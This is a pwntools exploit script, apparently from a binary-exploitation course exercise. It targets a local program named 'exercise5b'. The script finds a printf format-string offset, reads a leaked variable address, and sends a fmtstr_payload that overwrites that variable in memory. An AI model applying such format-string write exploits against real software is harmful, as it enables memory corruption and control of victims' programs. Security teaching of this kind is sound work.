#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from advancedpwn import ida
import re

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.binary = exe
context.log_level = "critical"
proxy = None

def signal_handler(signum, frame):
    global proxy
    if proxy is not None:
        proxy.exit_process()
        log.info("Killed IDA debugger window!")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Add IDA killer to process kill

def read_vals(read):
    regex = r"n (\S*) &n (\S*)"
    res = re.findall(regex, read)
    if len(res) != 1:
        raise Exception(f"Found not exactly one {res}")
    return res[0]

def exploitStart():
    def exec_fmt(payload):
        p = process(exe)
        p.sendline(payload)
        return p.recvall()
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    print(f"Found offset {offset}")

    global proxy
    r = context.binary.process()
    #proxy = ida.attach(r, "192.168.127.1", ida_start_port=31337, binary_path=context.binary.path)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # You can now communicate with the process, e.g.,

    n_val, n_add = read_vals(r.recvline().decode())
    n_add = int(n_add, 16)
    print(f"got {n_val} and {hex(n_add)}")
    # write into n 10 using the non used printf
    writes = {n_add: 10}
    offset = 10
    payload = fmtstr_payload(offset, writes, numbwritten=0, offset_bytes=0)
    assert len(payload) <= 128
    print(payload)
    r.sendline(payload)
    #r.interactive()
    r.recvuntil(b" &n ") # get rid of garbage
    print(r.recvall(timeout=.1).decode())

if __name__ == '__main__':
    exploitStart()